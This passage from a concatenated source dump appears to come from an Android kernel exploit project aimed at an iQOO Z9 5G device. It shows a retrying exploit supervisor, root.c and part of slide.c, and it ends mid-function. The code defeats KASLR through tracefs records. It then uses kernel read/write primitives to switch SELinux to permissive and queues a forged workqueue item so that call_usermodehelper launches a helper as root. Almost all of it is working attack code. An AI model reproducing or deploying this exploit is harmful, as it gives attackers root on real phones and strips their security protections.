      snprintf(delay, sizeof(delay), "%d", delay_usec);
      snprintf(attempt_text, sizeof(attempt_text), "%d", attempt);
      SYSCHK(setenv("PSELECT_DELAY_USEC", delay, 1));
      SYSCHK(setenv("S23_SUPERVISOR_ATTEMPT", attempt_text, 1));
#if defined(APP_PAYLOAD) && defined(SLIDE_P0_OFFSET_CANDIDATES)
      const char *forced_offset = getenv("SLIDE_P0_OFFSET");
      if (forced_offset) {
        pr_success("exploit attempt=%d/%d pid=%d delay=%d p0_offset=%s\n",
                   attempt, max_attempts, getpid(), delay_usec,
                   forced_offset);
      } else {
        pr_success("exploit attempt=%d/%d pid=%d delay=%d p0_offset=scan\n",
                   attempt, max_attempts, getpid(), delay_usec);
      }
#else
      pr_success("exploit attempt=%d/%d pid=%d delay=%d\n",
                 attempt, max_attempts, getpid(), delay_usec);
#endif
      _exit(run_exploit(1, argv));
    }

    int status = 0;
    pid_t waited = 0;
    struct timespec started;
    SYSCHK(clock_gettime(CLOCK_MONOTONIC, &started));
    for (;;) {
      waited = waitpid(child, &status, WNOHANG);
      if (waited == child) {
        break;
      }
      if (waited < 0 && errno != EINTR) {
        break;
      }

      struct timespec now;
      SYSCHK(clock_gettime(CLOCK_MONOTONIC, &now));
      time_t elapsed = now.tv_sec - started.tv_sec;
      int timeout_sec = attempt_timeout_sec;
#if defined(APP_PAYLOAD) && defined(SLIDE_P0_OFFSET_CANDIDATES)
      if (!getenv("SLIDE_P0_OFFSET") &&
          !atomic_load(&app_p0_state->slide_ready)) {
        timeout_sec = p0_attempt_timeout_sec;
      }
#endif
      if (elapsed >= timeout_sec) {
        pr_warning("exploit attempt=%d/%d timeout pid=%d seconds=%d\n",
                   attempt, max_attempts, child, timeout_sec);
        SYSCHK(kill(child, SIGKILL));
        do {
          waited = waitpid(child, &status, 0);
        } while (waited < 0 && errno == EINTR);
        break;
      }
      usleep(100000);
    }
    if (waited < 0) {
      pr_error("waitpid attempt=%d pid=%d errno=%d\n",
               attempt, child, errno);
    }
    if (waited == child && WIFEXITED(status) && WEXITSTATUS(status) == 0) {
      pr_success("exploit completed attempt=%d/%d\n", attempt, max_attempts);
      return;
    }

#if defined(APP_PAYLOAD) && defined(SLIDE_P0_OFFSET_CANDIDATES)
    if (atomic_load(&app_p0_state->writer_started)) {
      pr_error("stack writer ran; refusing retry on this boot\n");
      break;
    }
#endif

#if defined(APP_PAYLOAD) && defined(SLIDE_P0_OFFSET_CANDIDATES)
    if (!getenv("SLIDE_P0_OFFSET") &&
        atomic_load(&app_p0_state->p0_ready)) {
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
      pr_error("fresh P0 session was consumed by the failed child; "
               "refusing cross-process retry, reboot required\n");
      break;
#else
      uintptr_t offset = atomic_load(&app_p0_state->offset);
      uintptr_t gate_page = atomic_load(&app_p0_state->gate_page_struct);
      uintptr_t probe_page = atomic_load(&app_p0_state->probe_page_struct);
      char offset_arg[16];
      char gate_page_arg[24];
      char probe_page_arg[24];
      snprintf(offset_arg, sizeof(offset_arg), "0x%zx", offset);
      snprintf(gate_page_arg, sizeof(gate_page_arg), "0x%zx", gate_page);
      snprintf(probe_page_arg, sizeof(probe_page_arg), "0x%zx", probe_page);
      SYSCHK(setenv("SLIDE_P0_OFFSET", offset_arg, 1));
      SYSCHK(setenv("P0_GATE_PAGE_STRUCT", gate_page_arg, 1));
      SYSCHK(setenv("P0_PROBE_PAGE_STRUCT", probe_page_arg, 1));
      pr_success("supervisor retained p0_offset=%s gate=%s probe=%s\n",
                 offset_arg, gate_page_arg, probe_page_arg);
#endif
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
    } else if (!getenv("SLIDE_P0_OFFSET") &&
               atomic_load(&app_p0_state->dirty)) {
      pr_error("p0 oracle dirtied before slide discovery; refusing unsafe retry\n");
#else
    } else if (atomic_load(&app_p0_state->dirty)) {
      pr_error("p0 oracle state dirty or uncertain; refusing unsafe retry\n");
#endif
      break;
    }
#endif

    if (WIFSIGNALED(status)) {
      pr_warning("exploit attempt=%d/%d terminated signal=%d\n",
                 attempt, max_attempts, WTERMSIG(status));
    } else {
      pr_warning("exploit attempt=%d/%d failed status=%d\n",
                 attempt, max_attempts,
                  WIFEXITED(status) ? WEXITSTATUS(status) : status);
    }
#if defined(APP_PAYLOAD) && APP_PAYLOAD
    if (attempt < max_attempts) {
      pr_info("safe retry quiet delay seconds=5\n");
      sleep(5);
    }
#endif
  }

  pr_error("exploit failed after %d independent attempts\n", max_attempts);
  _exit(1);
}

```

---

## root.c

**Path**: `/root/s/references/iQOO-Z9_5G-vivo- research/payload/src/root.c`

```c
#include "common.h"

#include <stdlib.h>
#include <sys/un.h>

int root_child_done;
uint32_t root_uid_before = 0xffffffff;
uint32_t root_uid_after = 0xffffffff;

#define ROOT_SOCKET_PATH "/data/local/tmp/temp_su.sock"
#define ROOT_HOLD_READY_SOCKET "cve43499_roothold"

struct umh_subprocess_info {
  uint8_t work[48];
  uint64_t complete;
  uint64_t path;
  uint64_t argv;
  uint64_t envp;
  int32_t wait;
  int32_t retval;
  uint64_t init;
  uint64_t cleanup;
  uint64_t data;
};

struct umh_completion {
  uint32_t done;
  uint32_t pad0;
  uint32_t lock;
  uint32_t pad1;
  uint64_t next;
  uint64_t prev;
};

struct umh_kernel_data {
  struct umh_completion completion;
  char path[256];
  char arg[16];
  char uid[16];
  uint64_t argv[4];
  uint64_t envp[1];
};

_Static_assert(sizeof(struct umh_subprocess_info) == 112,
               "subprocess_info layout");
_Static_assert(sizeof(struct umh_completion) == 32, "completion layout");

static int root_read_data(
    int fd, uintptr_t target, void *data, size_t len) {
  return pipe_phys_read_data(fd, target, data, len);
}

static int root_write_data(
    int fd, uintptr_t target, const void *data, size_t len) {
  return pipe_phys_write_data(fd, target, data, len);
}

static int root_read_global(
    int fd, uintptr_t target, void *data, size_t len) {
  return configfs_read_once(fd, target, data, len) == (ssize_t)len;
}

static int root_write_global(
    int fd, uintptr_t target, const void *data, size_t len) {
  return configfs_write_once(fd, target, data, len) == (ssize_t)len;
}

static int root_read64(
    int fd, uintptr_t target, uint64_t *value) {
  return value && root_read_data(fd, target, value, sizeof(*value));
}

static int root_read32(
    int fd, uintptr_t target, uint32_t *value) {
  return value && root_read_data(fd, target, value, sizeof(*value));
}

static int root_write64(int fd, uintptr_t target, uint64_t value) {
  return root_write_data(fd, target, &value, sizeof(value));
}

static int root_write32(int fd, uintptr_t target, uint32_t value) {
  return root_write_data(fd, target, &value, sizeof(value));
}

static int root_write64_exact(int fd, uintptr_t target, uint64_t value) {
  uint64_t readback = 0;
  return root_write64(fd, target, value) &&
         root_read64(fd, target, &readback) && readback == value;
}

static int root_write32_exact(int fd, uintptr_t target, uint32_t value) {
  uint32_t readback = 0;
  return root_write32(fd, target, value) &&
         root_read32(fd, target, &readback) && readback == value;
}

static int root_restore64(
    int fd, uintptr_t target, uint64_t ours, uint64_t old) {
  uint64_t current = 0;
  if (!root_read64(fd, target, &current)) {
    return 0;
  }
  if (current == old) {
    return 1;
  }
  return current == ours && root_write64_exact(fd, target, old);
}

static int root_restore32(
    int fd, uintptr_t target, uint32_t ours, uint32_t old) {
  uint32_t current = 0;
  if (!root_read32(fd, target, &current)) {
    return 0;
  }
  if (current == old) {
    return 1;
  }
  return current == ours && root_write32_exact(fd, target, old);
}

static int root_all_zero(const void *data, size_t size) {
  const uint8_t *bytes = data;
  for (size_t i = 0; i < size; i++) {
    if (bytes[i]) {
      return 0;
    }
  }
  return 1;
}

static int wake_system_unbound(void) {
  char slave_name[128];
  int master_fd = posix_openpt(O_RDWR | O_NOCTTY | O_CLOEXEC);
  if (master_fd < 0 || grantpt(master_fd) != 0 ||
      unlockpt(master_fd) != 0 ||
      ptsname_r(master_fd, slave_name, sizeof(slave_name)) != 0) {
    if (master_fd >= 0) {
      close(master_fd);
    }
    return 0;
  }

  int slave_fd = open(slave_name, O_RDWR | O_NOCTTY | O_CLOEXEC);
  if (slave_fd < 0) {
    close(master_fd);
    return 0;
  }
  int master_close = close(master_fd);
  int slave_close = close(slave_fd);
  return master_close == 0 && slave_close == 0;
}

static int root_socket_ready(void) {
  int fd = socket(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
  if (fd < 0) {
    return 0;
  }

  struct sockaddr_un sun;
  memset(&sun, 0, sizeof(sun));
  sun.sun_family = AF_UNIX;
  snprintf(sun.sun_path, sizeof(sun.sun_path), "%s", ROOT_SOCKET_PATH);
  int ready = connect(fd, (struct sockaddr *)&sun, sizeof(sun)) == 0;
  close(fd);
  return ready;
}

#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
    (!defined(APP_ROOT_REF_HOLDER_REQUIRED) || APP_ROOT_REF_HOLDER_REQUIRED)
static int root_hold_socket_ready(void) {
  int fd = socket(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
  if (fd < 0) {
    return 0;
  }
  struct sockaddr_un address;
  memset(&address, 0, sizeof(address));
  address.sun_family = AF_UNIX;
  memcpy(address.sun_path + 1, ROOT_HOLD_READY_SOCKET,
         sizeof(ROOT_HOLD_READY_SOCKET) - 1);
  socklen_t address_length = (socklen_t)(
      offsetof(struct sockaddr_un, sun_path) +
      sizeof(ROOT_HOLD_READY_SOCKET));
  int ready = connect(fd, (struct sockaddr *)&address, address_length) == 0;
  close(fd);
  return ready;
}
#endif

static int install_workqueue_umh_root(int fd) {
  uintptr_t selinux_addr = data_addr(SELINUX_ENFORCING);
  uint8_t permissive = 0;
  uint8_t selinux_old = 0;
  uint8_t selinux_readback = 0;
  uintptr_t fake_work_addr = page_base + ROOT_UMH_WORK_OFF;
  uintptr_t umh_data_addr = page_base + ROOT_UMH_DATA_OFF;
  uint8_t saved_work[sizeof(struct umh_subprocess_info)];
  uint8_t saved_data[sizeof(struct umh_kernel_data)];
  uint8_t scratch_readback[sizeof(struct umh_kernel_data)];
  int scratch_saved = 0;
  int selinux_changed = 0;
  int inflight_changed = 0;
  int active_changed = 0;
  int refcnt_changed = 0;
  int list_prev_changed = 0;
  int published = 0;
  uint32_t complete_done = 0;
  int socket_ok = 0;
  int result = 0;
  struct umh_kernel_data umh_data;
  memset(&umh_data, 0, sizeof(umh_data));
  const char *root_umh_path = ROOT_UMH_PATH;
#if defined(APP_PAYLOAD) && APP_PAYLOAD
  const char *app_root_umh_path = getenv("CVE43499_ROOT_HELPER");
  if (!app_root_umh_path || app_root_umh_path[0] != '/') {
    pr_error("root umh missing CVE43499_ROOT_HELPER\n");
    return 0;
  }
  root_umh_path = app_root_umh_path;
#endif
  if (snprintf(umh_data.path, sizeof(umh_data.path), "%s", root_umh_path) >=
      (int)sizeof(umh_data.path)) {
    pr_error("root umh helper path too long\n");
    return 0;
  }
  snprintf(umh_data.arg, sizeof(umh_data.arg), "%s", "--umh");
  snprintf(umh_data.uid, sizeof(umh_data.uid), "%u", getuid());
  uintptr_t completion_addr =
      umh_data_addr + offsetof(struct umh_kernel_data, completion);
  uintptr_t wait_list_addr =
      completion_addr + offsetof(struct umh_completion, next);
  uintptr_t path_addr =
      umh_data_addr + offsetof(struct umh_kernel_data, path);
  uintptr_t arg_addr =
      umh_data_addr + offsetof(struct umh_kernel_data, arg);
  uintptr_t uid_addr =
      umh_data_addr + offsetof(struct umh_kernel_data, uid);
  uintptr_t argv_addr =
      umh_data_addr + offsetof(struct umh_kernel_data, argv);
  uintptr_t envp_addr =
      umh_data_addr + offsetof(struct umh_kernel_data, envp);
  umh_data.completion.next = wait_list_addr;
  umh_data.completion.prev = wait_list_addr;
  umh_data.argv[0] = path_addr;
  umh_data.argv[1] = arg_addr;
  umh_data.argv[2] = uid_addr;
  umh_data.argv[3] = 0;
  umh_data.envp[0] = 0;
#if defined(CALL_USERMODEHELPER_EXEC_WORK_CFI_JT)
  uint64_t umh_work_func = text_addr(CALL_USERMODEHELPER_EXEC_WORK_CFI_JT);
#else
  uint64_t umh_work_func = text_addr(CALL_USERMODEHELPER_EXEC_WORK);
#endif

  uintptr_t fake_work_end = fake_work_addr + sizeof(saved_work) - 1;
  uintptr_t umh_data_end = umh_data_addr + sizeof(saved_data) - 1;
  if (!is_direct_ptr(fake_work_addr) || !is_direct_ptr(umh_data_addr) ||
      fake_work_end < fake_work_addr || umh_data_end < umh_data_addr ||
      (fake_work_addr >> PAGE_SHIFT) != (fake_work_end >> PAGE_SHIFT) ||
      (umh_data_addr >> PAGE_SHIFT) != (umh_data_end >> PAGE_SHIFT) ||
      !(fake_work_end < umh_data_addr || umh_data_end < fake_work_addr)) {
    pr_error("root umh bad scratch spans work=%016zx-%016zx data=%016zx-%016zx\n",
             fake_work_addr, fake_work_end, umh_data_addr, umh_data_end);
    return 0;
  }
  if (!root_read_data(fd, fake_work_addr, saved_work, sizeof(saved_work)) ||
      !root_read_data(fd, umh_data_addr, saved_data, sizeof(saved_data))) {
    pr_error("root umh scratch old read failed\n");
    return 0;
  }
  scratch_saved = 1;
  if (!root_all_zero(saved_work, sizeof(saved_work)) ||
      !root_all_zero(saved_data, sizeof(saved_data))) {
    pr_error("root umh scratch not zero work=%d data=%d\n",
             root_all_zero(saved_work, sizeof(saved_work)),
             root_all_zero(saved_data, sizeof(saved_data)));
    return 0;
  }
  int selinux_read = root_read_global(
      fd, selinux_addr, &selinux_old, sizeof(selinux_old));
  if (!selinux_read) {
    pr_error("root umh selinux read failed direct=%016zx virtual=%016zx\n",
             selinux_addr, text_addr(SELINUX_ENFORCING));
    return 0;
  }
  if (selinux_old > 1) {
    pr_error("root umh bad selinux old=%u\n", selinux_old);
    return 0;
  }
  pr_info("root umh spans work=%016zx-%016zx data=%016zx-%016zx selinux=%016zx old=%u\n",
          fake_work_addr, fake_work_end, umh_data_addr, umh_data_end,
          selinux_addr, selinux_old);

  unlink(ROOT_SOCKET_PATH);

  uintptr_t wq_slot = data_addr(SYSTEM_UNBOUND_WQ);
  uint64_t wq_value = 0;
  uint64_t pwq_value = 0;
  uint64_t pool_value = 0;
  uint64_t pwq_wq_value = 0;
  if (!root_read_global(fd, wq_slot, &wq_value, sizeof(wq_value))) {
    pr_error("root umh workqueue slot read failed\n");
    goto cleanup;
  }
  uintptr_t wq = (uintptr_t)wq_value;
  if (!is_direct_ptr(wq) ||
      !root_read64(fd, wq + WQ_DFL_PWQ_OFF, &pwq_value)) {
    pr_error("root umh pwq read failed wq=%016zx\n", wq);
    goto cleanup;
  }
  uintptr_t pwq = (uintptr_t)pwq_value;
  if (!is_direct_ptr(pwq) ||
      !root_read64(fd, pwq + PWQ_POOL_OFF, &pool_value) ||
      !root_read64(fd, pwq + PWQ_WQ_OFF, &pwq_wq_value)) {
    pr_error("root umh pool read failed pwq=%016zx\n", pwq);
    goto cleanup;
  }
  uintptr_t pool = (uintptr_t)pool_value;
  uintptr_t pwq_wq = (uintptr_t)pwq_wq_value;
  if (!is_direct_ptr(wq) || !is_direct_ptr(pwq) ||
      !is_direct_ptr(pool) || pwq_wq != wq) {
    pr_error("root umh bad workqueue wq_slot=%016zx wq=%016zx "
             "pwq=%016zx pool=%016zx pwq_wq=%016zx\n",
             wq_slot, wq, pwq, pool, pwq_wq);
    return 0;
  }

  uintptr_t worklist = pool + POOL_WORKLIST_OFF;
  uint64_t list_next = 0;
  uint64_t list_prev = 0;
  uint32_t nr_idle = 0;
  for (int i = 0; i < 200; i++) {
    if (!root_read64(fd, worklist, &list_next) ||
        !root_read64(fd, worklist + sizeof(uint64_t), &list_prev) ||
        !root_read32(fd, pool + POOL_NR_IDLE_OFF, &nr_idle)) {
      pr_error("root umh pool state read failed\n");
      goto cleanup;
    }
    if (list_next == worklist && list_prev == worklist && nr_idle > 0) {
      break;
    }
    usleep(1000);
  }
  if (list_next != worklist || list_prev != worklist || nr_idle == 0) {
    pr_error("root umh pool busy pool=%016zx list=%016llx/%016llx "
             "head=%016zx idle=%u\n",
             pool, (unsigned long long)list_next,
             (unsigned long long)list_prev, worklist, nr_idle);
    goto cleanup;
  }

  uint32_t color = 0;
  uint32_t refcnt = 0;
  uint32_t nr_active = 0;
  uint32_t max_active = 0;
  if (!root_read32(fd, pwq + PWQ_WORK_COLOR_OFF, &color) ||
      !root_read32(fd, pwq + PWQ_REFCNT_OFF, &refcnt) ||
      !root_read32(fd, pwq + PWQ_NR_ACTIVE_OFF, &nr_active) ||
      !root_read32(fd, pwq + PWQ_MAX_ACTIVE_OFF, &max_active)) {
    pr_error("root umh pwq state read failed\n");
    goto cleanup;
  }
  if (color >= 16 || refcnt == 0 || nr_active >= max_active) {
    pr_error("root umh bad pwq state color=%u refcnt=%u active=%u/%u\n",
             color, refcnt, nr_active, max_active);
    goto cleanup;
  }

  uintptr_t inflight_addr =
      pwq + PWQ_NR_IN_FLIGHT_OFF + color * sizeof(uint32_t);
  uint32_t nr_inflight = 0;
  if (!root_read32(fd, inflight_addr, &nr_inflight) ||
      nr_inflight == UINT32_MAX || nr_active == UINT32_MAX ||
      refcnt == UINT32_MAX) {
    pr_error("root umh bad counters inflight=%u active=%u refcnt=%u\n",
             nr_inflight, nr_active, refcnt);
    goto cleanup;
  }
  uintptr_t fake_entry = fake_work_addr + WORK_ENTRY_OFF;
  uint64_t work_data = pwq | ((uint64_t)color << 4) | 5;
  struct umh_subprocess_info fake;
  memset(&fake, 0, sizeof(fake));
  memcpy(fake.work + WORK_DATA_OFF, &work_data, sizeof(work_data));
  memcpy(fake.work + WORK_ENTRY_OFF, &worklist, sizeof(worklist));
  memcpy(fake.work + WORK_ENTRY_OFF + sizeof(uint64_t),
         &worklist, sizeof(worklist));
  memcpy(fake.work + WORK_FUNC_OFF, &umh_work_func,
         sizeof(umh_work_func));
  fake.complete = completion_addr;
  fake.path = path_addr;
  fake.argv = argv_addr;
  fake.envp = envp_addr;

  int data_write = root_write_data(
      fd, umh_data_addr, &umh_data, sizeof(umh_data));
  int work_write = root_write_data(
      fd, fake_work_addr, &fake, sizeof(fake));
  if (!data_write || !work_write ||
      !root_read_data(fd, umh_data_addr, scratch_readback,
                      sizeof(umh_data)) ||
      memcmp(scratch_readback, &umh_data, sizeof(umh_data)) != 0 ||
      !root_read_data(fd, fake_work_addr, scratch_readback,
                      sizeof(fake)) ||
      memcmp(scratch_readback, &fake, sizeof(fake)) != 0) {
    pr_error("root umh scratch write/readback failed data=%d work=%d\n",
             data_write, work_write);
    goto cleanup;
  }

  if (selinux_old != permissive) {
    selinux_changed = 1;
    if (!root_write_global(fd, selinux_addr, &permissive,
                           sizeof(permissive)) ||
        !root_read_global(fd, selinux_addr, &selinux_readback,
                          sizeof(selinux_readback)) ||
        selinux_readback != permissive) {
      pr_error("root umh selinux write/readback failed now=%u\n",
               selinux_readback);
      goto cleanup;
    }
  }

  if (!root_read64(fd, worklist, &list_next) ||
      !root_read64(fd, worklist + sizeof(uint64_t), &list_prev) ||
      list_next != worklist || list_prev != worklist) {
    pr_error("root umh worklist changed before queue next=%016llx prev=%016llx\n",
             (unsigned long long)list_next,
             (unsigned long long)list_prev);
    goto cleanup;
  }

  inflight_changed = 1;
  int inflight_write = root_write32_exact(
      fd, inflight_addr, nr_inflight + 1);
  active_changed = 1;
  int active_write = inflight_write && root_write32_exact(
      fd, pwq + PWQ_NR_ACTIVE_OFF, nr_active + 1);
  refcnt_changed = 1;
  int refcnt_write = active_write && root_write32_exact(
      fd, pwq + PWQ_REFCNT_OFF, refcnt + 1);
  list_prev_changed = 1;
  int list_prev_write = refcnt_write && root_write64_exact(
      fd, worklist + sizeof(uint64_t), fake_entry);
  if (!list_prev_write ||
      !root_read64(fd, worklist, &list_next) || list_next != worklist) {
    pr_error("root umh prepublish write failed counters=%d/%d/%d prev=%d next=%016llx\n",
             inflight_write, active_write, refcnt_write, list_prev_write,
             (unsigned long long)list_next);
    goto cleanup;
  }

  int list_next_write = root_write64(fd, worklist, fake_entry);
  uint64_t published_next = 0;
  if (list_next_write ||
      (root_read64(fd, worklist, &published_next) &&
       published_next == fake_entry)) {
    published = 1;
  } else {
    pr_error("root umh publish failed ret=%d next=%016llx\n",
             list_next_write, (unsigned long long)published_next);
    goto cleanup;
  }
  pr_info("root umh queued wq=%016zx pwq=%016zx pool=%016zx "
          "work=%016zx entry=%016zx color=%u counters=%u/%u/%u "
          "writes=%d/%d/%d/%d/%d/%d/%d\n",
          wq, pwq, pool, fake_work_addr, fake_entry, color,
          nr_inflight, nr_active, refcnt, data_write, work_write,
          inflight_write, active_write, refcnt_write,
          list_prev_write, list_next_write);

  int wake_ok = 0;
  for (int i = 0; i < 8 && !complete_done; i++) {
    wake_ok |= wake_system_unbound();
    for (int j = 0; j < 250; j++) {
      if (!root_read32(fd, completion_addr, &complete_done)) {
        pr_error("root umh completion read failed\n");
        goto cleanup;
      }
      if (complete_done) {
        break;
      }
      usleep(1000);
    }
  }

  uint32_t retval_value = 0;
  if (complete_done &&
      !root_read32(fd,
                   fake_work_addr +
                       offsetof(struct umh_subprocess_info, retval),
                   &retval_value)) {
    pr_error("root umh retval read failed\n");
    goto cleanup;
  }
  int32_t umh_retval = (int32_t)retval_value;
  if (complete_done) {
    for (int i = 0; i < 200; i++) {
      if (root_socket_ready()) {
        socket_ok = 1;
        break;
      }
      usleep(10000);
    }
  }

  pr_info("root umh result wake=%d complete=%u retval=%d socket=%d\n",
          wake_ok, complete_done, umh_retval, socket_ok);
  result = socket_ok;

cleanup:
  if (!published) {
    int rollback_ok = 1;
    if (list_prev_changed) {
      rollback_ok &= root_restore64(
          fd, worklist + sizeof(uint64_t), fake_entry, list_prev);
    }
    if (refcnt_changed) {
      rollback_ok &= root_restore32(
          fd, pwq + PWQ_REFCNT_OFF, refcnt + 1, refcnt);
    }
    if (active_changed) {
      rollback_ok &= root_restore32(
          fd, pwq + PWQ_NR_ACTIVE_OFF, nr_active + 1, nr_active);
    }
    if (inflight_changed) {
      rollback_ok &= root_restore32(
          fd, inflight_addr, nr_inflight + 1, nr_inflight);
    }
    if (!rollback_ok) {
      pr_error("root umh prepublish rollback failed\n");
    }
  } else if (!complete_done) {
    pr_error("root umh published but incomplete; scratch retained\n");
  }

  if (scratch_saved && (!published || complete_done)) {
    int work_restore = root_write_data(
        fd, fake_work_addr, saved_work, sizeof(saved_work));
    int data_restore = root_write_data(
        fd, umh_data_addr, saved_data, sizeof(saved_data));
    int work_read = root_read_data(
        fd, fake_work_addr, scratch_readback, sizeof(saved_work));
    int work_match = work_read &&
                     memcmp(scratch_readback, saved_work,
                            sizeof(saved_work)) == 0;
    int data_read = root_read_data(
        fd, umh_data_addr, scratch_readback, sizeof(saved_data));
    int data_match = data_read &&
                     memcmp(scratch_readback, saved_data,
                            sizeof(saved_data)) == 0;
    pr_info("root umh scratch restore work=%d/%d data=%d/%d\n",
            work_restore, work_match, data_restore, data_match);
    if (!work_restore || !work_match || !data_restore || !data_match) {
      pr_error("root umh scratch restore failed\n");
    }
  }

  if (!result && selinux_changed && (!published || complete_done)) {
    uint8_t current = 0xff;
    int read_ok = root_read_global(fd, selinux_addr, &current,
                                   sizeof(current));
    int restore_ok = read_ok &&
        (current == selinux_old ||
         (current == permissive &&
          root_write_global(fd, selinux_addr, &selinux_old,
                            sizeof(selinux_old)) &&
          root_read_global(fd, selinux_addr, &current, sizeof(current)) &&
          current == selinux_old));
    pr_info("root umh selinux rollback=%d old=%u now=%u\n",
            restore_ok, selinux_old, current);
    if (!restore_ok) {
      pr_error("root umh selinux rollback failed\n");
    }
  } else if (!result && selinux_changed) {
    pr_error("root umh selinux retained while published work is incomplete\n");
  } else if (result) {
    pr_info("root umh selinux left=%u intended root state old=%u\n",
            permissive, selinux_old);
  }

  root_child_done = socket_ok;
  root_uid_after = socket_ok ? 0 : root_uid_before;
  return result;
}

int install_android_root(int fd) {
  root_uid_before = getuid();
  pr_info("root configfs-pipe start uid=%u fd=%d\n", root_uid_before, fd);
  int installed = install_workqueue_umh_root(fd);
#if defined(APP_PAYLOAD) && APP_PAYLOAD
#if defined(APP_ROOT_REF_HOLDER_REQUIRED) && \
    !APP_ROOT_REF_HOLDER_REQUIRED
  if (installed) {
    pr_info("root reference holder not required by target route\n");
  }
#else
#if defined(QEMU_FORCED_SLIDE_TEST) && QEMU_FORCED_SLIDE_TEST
  if (installed) {
    pr_info("root p0 reference holder not required for qemu forced slide\n");
  }
#else
#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
  if (installed && (p0_gate_page_struct || p0_probe_page_struct)) {
#else
  if (installed) {
#endif
    int holder_ready = 0;
    for (int attempt = 0; attempt < 200; attempt++) {
      if (root_hold_socket_ready()) {
        holder_ready = 1;
        break;
      }
      usleep(10000);
    }
    pr_info("root p0 reference holder ready=%d\n", holder_ready);
    if (!holder_ready) {
      root_child_done = 0;
      root_uid_after = root_uid_before;
      return 0;
    }
#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
  } else if (installed) {
    pr_info("root p0 reference holder not required for cached virtual base\n");
#endif
  }
#endif
#endif
#endif
  return installed;
}

```

---

## slide.c

**Path**: `/root/s/references/iQOO-Z9_5G-vivo- research/payload/src/slide.c`

```c
#include "common.h"

#define SLIDE_TRACEFS_ROOT "/sys/kernel/tracing"
#ifndef SLIDE_TRACEFS_EVENT_ID
#define SLIDE_TRACEFS_EVENT_ID 109
#endif
#ifndef SLIDE_TRACEFS_MAX_CANDIDATE
#define SLIDE_TRACEFS_MAX_CANDIDATE 0x1f0000ULL
#endif

static int slide_tracefs_write(const char *path, const char *value) {
  int fd = open(path, O_WRONLY | O_CLOEXEC);
  if (fd < 0) {
    return 0;
  }
  size_t len = strlen(value);
  ssize_t wrote = write(fd, value, len);
  close(fd);
  return wrote == (ssize_t)len;
}

static int slide_tracefs_parse_page(
    const unsigned char *page, size_t page_len, uintptr_t *candidate_out) {
  if (page_len < 20) {
    return 0;
  }

  uint64_t commit = 0;
  memcpy(&commit, page + 8, sizeof(commit));
  size_t data_len = (size_t)(commit & 0xfffULL);
  size_t end = 16 + data_len;
  if (end > page_len) {
    end = page_len;
  }

  for (size_t pos = 16; pos + 4 <= end;) {
    uint32_t event_header = 0;
    memcpy(&event_header, page + pos, sizeof(event_header));
    uint32_t type_len = event_header & 0x1fU;
    if (type_len == 30) {
      pos += 8;
      continue;
    }
    if (type_len == 31) {
      pos += 12;
      continue;
    }
    if (type_len == 0 || type_len >= 29) {
      break;
    }

    size_t record_len = (size_t)type_len * 4;
    size_t record = pos + 4;
    if (record + record_len > end) {
      break;
    }
    uint16_t event_id = 0;
    memcpy(&event_id, page + record, sizeof(event_id));
    if (event_id == SLIDE_TRACEFS_EVENT_ID && record_len >= 24) {
      uint64_t caller = 0;
      memcpy(&caller, page + record + 16, sizeof(caller));
      static int raw_callers;
      if (raw_callers < 8) {
        pr_info("slide tracefs raw caller=%016llx event=%u len=%zu\n",
                (unsigned long long)caller, event_id, record_len);
      }
      raw_callers++;
#if defined(SLIDE_TRACEFS_STRIP_PAC) && SLIDE_TRACEFS_STRIP_PAC
      /* iqoo-z9-5g: kernel PAC-ret signs saved PCs; restore bits [63:48].
       * The __get_wchan unwind loop also misdetects sched-region frames on
       * ~50% of boots (PAC bits shift the value below the range compare),
       * so the schedule-internal return address is accepted as an anchor
       * alongside the worker_thread caller. */
      caller = (caller & 0x0000ffffffffffffULL) | 0xffff000000000000ULL;
#endif
      static const uint64_t anchor_offsets[] = {
        SLIDE_TRACEFS_WORKER_CALLER_OFF,
#ifdef SLIDE_TRACEFS_SCHED_CALLER_OFF
        SLIDE_TRACEFS_SCHED_CALLER_OFF,
#endif
      };
      for (size_t anchor = 0;
           anchor < sizeof(anchor_offsets) / sizeof(anchor_offsets[0]);
           anchor++) {
        uint64_t base = caller - anchor_offsets[anchor];
        /* RELR-relocated kernels (MTK) load at an arbitrary virtual base
         * far above KIMAGE_TEXT_BASE; accept any 64K-aligned base inside
         * the kernel VA window and require a second confirming event. */
        if (base >= KIMAGE_TEXT_BASE && base < 0xfffffffe00000000ULL &&
            (base & 0xffffULL) == 0) {
          uint64_t candidate = base - KIMAGE_TEXT_BASE;
          if (candidate > SLIDE_TRACEFS_MAX_CANDIDATE) {
            continue;
          }
          static uint64_t pending_base;
          static int pending_hits;
          if (base != pending_base) {
            pending_base = base;
            pending_hits = 1;
            continue;
          }
          pending_hits++;
          if (pending_hits < 3) {
            continue;
          }
          pr_success("slide tracefs caller=%016llx anchor=%zu "
                     "base=%016llx candidate=%016llx\n",
                     (unsigned long long)caller, anchor,
                     (unsigned long long)base,
                     (unsigned long long)candidate);
          *candidate_out = (uintptr_t)candidate;
          return 1;
        }
      }
    }
    pos = record + record_len;
  }
  return 0;
}

static int slide_tracefs_trigger(void) {
  char path[96];
  snprintf(path, sizeof(path), "/data/local/tmp/.s23-trace-io-%d", getpid());
  int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0600);
  if (fd < 0) {
    pr_error("slide tracefs trigger open failed errno=%d\n", errno);
    return 0;
  }
  size_t chunk_size = 0x40000;
  unsigned char *chunk = calloc(1, chunk_size);
  if (!chunk) {
    int saved_errno = errno;
    close(fd);
    unlink(path);
    errno = saved_errno;
    pr_error("slide tracefs trigger alloc failed errno=%d\n", errno);
    return 0;
  }
  int ok = 1;
  for (int round = 0; round < 16 && ok; round++) {
    size_t done = 0;
    while (done < chunk_size) {
      ssize_t wrote = write(fd, chunk + done, chunk_size - done);
      if (wrote < 0 && errno == EINTR) {
        continue;
      }
      if (wrote <= 0) {
        ok = 0;
        break;
      }
      done += (size_t)wrote;
    }
  }
  free(chunk);
  if (ok && fsync(fd) != 0) {
    ok = 0;
  }
